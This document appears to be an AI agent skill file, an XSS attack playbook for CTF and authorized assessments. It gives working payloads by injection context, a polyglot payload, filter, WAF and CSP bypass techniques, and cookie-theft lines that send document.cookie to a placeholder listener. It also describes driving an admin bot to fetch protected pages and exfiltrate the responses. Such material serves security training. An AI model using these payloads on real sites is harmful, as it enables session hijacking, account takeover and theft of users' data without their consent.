name: xss
description: Cross-site scripting (XSS) — reflected/stored/DOM/blind discovery, polyglot payloads, filter/CSP bypass, and impact escalation (session/cookie theft, admin takeover). Use when user input is reflected or stored in a page and rendered without encoding.
---

# XSS Attack Playbook

Authorized CTF/assessment use. XSS = your JS runs in a victim's browser. In CTF the goal is usually stealing an admin cookie/session (the flag is behind it) or triggering an admin action. Find the sink, confirm execution, then escalate.

## 1. Types & where to look

- **Reflected:** input in URL reflected into the page → test every query param/header.
- **Stored:** input persisted (comment, profile, review) and rendered later → the admin bot is the victim.
- **DOM:** input reaches `innerHTML`/`eval`/`document.write` client-side → test fragments/`#` and JS sinks.
- **Blind:** payload fires later (admin panel, log viewer) → use an OOB payload that pings your listener.

**Confirm first:** `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `"><svg/onload=alert(1)>`.

## 2. Context & payload selection

Match the payload to the sink:
```
text node      → <script>alert(1)</script>
attribute      → " onfocus=alert(1) autofocus="   /  '><img src=x onerror=alert(1)>
URL/href       → javascript:alert(1)
DOM innerHTML  → <img src=x onerror=alert(1)>  (script tags don't run via innerHTML)
```
**Polyglot** (works in many contexts): `jaVasCript:/*-/*`/*`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e`

## 3. Filter / WAF / CSP bypass

- **Filter blocks `<script>`** → event handlers (`onerror`, `onload`, `onclick`), `<svg>`, `<img>`, `<iframe>`, or case/encoding obfuscation (`<ScRiPt>`, `\x3cscript\x3e`, HTML entities).
- **Blocks `alert`/`(`** → `window['al'+'ert']`, `top[/al/.source+/ert/.source]`, backticks, `String.fromCharCode`.
- **CSP `script-src 'self'`** → look for a JSONP/`<script src>` allowed endpoint, or DOM sink that doesn't need script (dangling markup, `javascript:` URL).
- **DOM clobbering / mutation XSS** → payloads that only become executable after DOM mutation (`<noscript>` + nested, SVG/mathML re-parse).

## 4. Escalate (CTF = steal the cookie/flag)

```
<img src=x onerror="fetch('http://YOUR_LISTENER/?c='+document.cookie)">
<script>new Image().src='//YOUR_LISTENER/'+document.cookie</script>
```
If there's an admin bot that visits your stored payload, the cookie arrives at your listener → reuse it as admin → flag. If `HttpOnly` blocks cookie theft, do admin actions via the bot instead (`fetch('/admin/flag', {credentials:'include'})` then exfil the response).

## Cross-cutting
- **The sink decides the payload** — text node vs attribute vs DOM each need a different shape.
- **In CTF, XSS is a cookie/flag delivery mechanism** — the bot is the victim; aim the payload at stealing or exfiltrating.
- Self-verify: your payload actually executes (alert/console/callback) before aiming it at the bot.
